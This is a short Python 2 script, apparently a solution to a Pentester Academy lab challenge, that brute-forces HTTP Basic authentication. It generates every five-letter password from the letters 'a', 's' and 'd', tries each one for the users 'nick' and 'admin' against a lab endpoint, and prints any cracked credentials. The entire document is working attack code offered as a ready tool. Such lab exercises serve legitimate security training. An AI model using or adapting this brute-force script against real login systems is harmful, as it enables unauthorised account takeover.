import httplib
import base64
password=[]
for a in ['a','s','d']:
    for b in ['a','s','d']:
        for c in ['a','s','d']:
            for d in ['a','s','d']:
                for e in ['a','s','d']:
                     password.append(a+b+c+d+e)
user=['nick','admin']
for u in user:
    
    for x in password:
    
        conn=httplib.HTTPConnection('pentesteracademylab.appspot.com')
        auth=u+":"+x
        headers={'Content-Length': '0','Authorization': 'Basic '+auth.encode('base64','strict')}
        conn.request('POST','/lab/webapp/basicauth',"",headers)
        response=conn.getresponse()
        if "Unauthorized! Unauthorized! Unauthorized :) :)" in response.read():
            print "Password: "+x+" Failed"
        else:
            print "Challenge Cracked"
            print "Password Is "+x
            print "User :"+u
            break;
